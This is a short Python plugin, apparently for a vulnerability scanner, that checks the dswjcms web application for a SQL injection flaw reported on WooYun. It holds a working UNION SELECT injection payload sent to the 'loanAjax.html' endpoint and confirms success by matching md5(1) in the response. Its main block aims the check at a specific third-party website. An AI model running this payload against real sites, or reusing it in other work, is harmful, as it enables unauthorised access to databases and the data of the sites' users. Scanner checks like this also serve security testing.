#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:xq17
#ref::http://www.wooyun.org/bugs/wooyun-2015-0141364

def assign(service,arg):
    if service=="dswjcms":
        return True,arg
    
    
def audit(arg):
    payload = "Loan/loanAjax.html?type=1&state=1"
    url=arg + payload + ')+UNION+SELECT+1%2c2%2c3%2c(select+concat(0x5c%2cmd5(1))+from+information_schema.tables+limit+1)%2c5%2c6%2c7%2c8%2c9%2c10%2c11%2c12%2c13%2c14%2c15%2c16%2c17%2c18%2c19%2c20%2c21%2c22%2c23%2c24%2c25%2c26%2c27%2c28%2c29%2c30%2c31%2c32%2c33%2c34%23%26classify%3d1%26scope%3d1'
    code, head, res, errcode,finalurl =  curl.curl(url)
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole('find sql injection: ' + url)

                

if  __name__ == '__main__':
    from dummy import *
    audit(assign("dswjcms","http://www.rongxin999.com/")[1])
